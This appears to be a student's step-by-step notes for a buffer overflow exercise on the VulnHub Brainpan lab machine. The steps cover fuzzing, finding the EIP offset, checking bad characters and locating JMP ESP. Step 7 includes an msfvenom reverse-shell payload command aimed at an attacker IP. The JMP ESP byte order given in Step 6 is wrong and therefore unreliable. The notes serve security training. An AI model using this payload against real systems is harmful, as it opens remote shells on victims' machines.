#bufferOverflow

This is my first BufferOverflow exerise - VulnHub Brainpan

Tool: Immunity Debugger

Step 1 - Find the EIP 
  using fuzzing to locate the buffer overflow point - the EIP address
  
  Create an array of buffers, from 1 to 5900, with increments of 100. Send the buffer to the 
  
  target until received system crash  and checked the size of buffers that made the system crash

  Program: 1-fuzzer_eip.py
  
Step 2 Control the EIP address 
 
  2.1 by binary tree analysis

  2.2 using metasploit
  Generate a pattern of string and send to the system. check the EIP 
  
    locate the pattern_create
    
    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 9999
    
    /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 9999 -q 39694438
    
  Program: 2-controlling-eip.py
  
  
   
Step 3 Locating Space and prepare the shellCode

    Finding the ESP addess 
    buffer = "A" * 2606 + "B" * 4 + "C" * (3500 – 2606 - 4)
  
  Program: 2-controlling-eip.py

Step 4 Check Bad Characters

    Send \x01...\xff to the system and check which char(s) have been truncated
    Program: 3-controlling-eip.py
  

Step 5 check any memory protections such as DEP adn ASLR
    
    Immunity Debugger Command: !mona modules
  

Step 6 Locate the JMP ESP

    /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
  
    JMP ESP address => \xe4\xff
  
  Immunity Debugger Command: !mona find -s "\xe4\xff" -m <program name>
  
  
Step 7 Generating ShellCode using Metasploit

    Metasploit Command: msfvenom -l payloads
  
    Metasploit Command: msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"
  
    -f format
    -e encode
    -b exclude character 
 
 Step 8 Sending the ShellCode 
 
  Program: 4-expolit-lin.py
  
  Program: 4-expolit-win.py
 
  
